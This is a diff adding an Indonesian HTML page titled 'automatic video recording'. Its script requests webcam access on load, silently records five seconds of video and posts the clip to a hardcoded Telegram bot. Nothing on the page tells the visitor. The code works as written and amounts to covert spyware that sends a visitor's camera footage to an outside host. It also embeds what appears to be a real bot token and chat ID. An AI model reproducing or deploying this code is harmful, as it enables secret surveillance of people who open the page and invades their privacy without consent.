@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Perekaman Video Otomatis</title>
+    <style>
+        video {
+            width: 100%;
+            max-width: 600px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Perekaman Video Otomatis</h1>
+    <video id="video" autoplay></video>
+
+    <script>
+        const video = document.getElementById('video');
+        let mediaRecorder;
+        let recordedBlobs;
+
+        // Minta akses kamera dan mulai merekam otomatis
+        navigator.mediaDevices.getUserMedia({video: true})
+            .then(stream => {
+                video.srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = handleDataAvailable;
+                mediaRecorder.onstop = handleStop;
+
+                // Mulai merekam setelah 1 detik
+                setTimeout(() => {
+                    recordedBlobs = [];
+                    mediaRecorder.start();
+                    console.log('Recording started automatically');
+                    
+                    // Hentikan perekaman setelah 5 detik
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        console.log('Recording stopped automatically');
+                    }, 5000); // Ubah durasi sesuai keperluan
+                }, 1000); // Tunggu 1 detik sebelum mulai merekam
+            })
+            .catch(err => {
+                console.error('Error accessing camera: ' + err);
+            });
+
+        function handleDataAvailable(event) {
+            if (event.data.size > 0) {
+                recordedBlobs.push(event.data);
+            }
+        }
+
+        function handleStop() {
+            const blob = new Blob(recordedBlobs, {type: 'video/webm'});
+            const url = URL.createObjectURL(blob);
+            sendToTelegram(blob);
+        }
+
+        // Fungsi untuk mengirim video ke Telegram
+        function sendToTelegram(blob) {
+            const chatId = '8076966728'; // Ganti dengan ID chat Telegrammu
+            const botToken = '8753482679:AAFTV0uUmr2eGMZwe4NCITQ591dSdauxmPM'; // Ganti dengan token bot Telegrammu
+            
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', blob, 'recorded_video.webm');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Video sent:', data);
+            })
+            .catch(error => {
+                console.error('Error sending video to Telegram:', error);
+            });
+        }
+    </script>
+</body>
+</html>
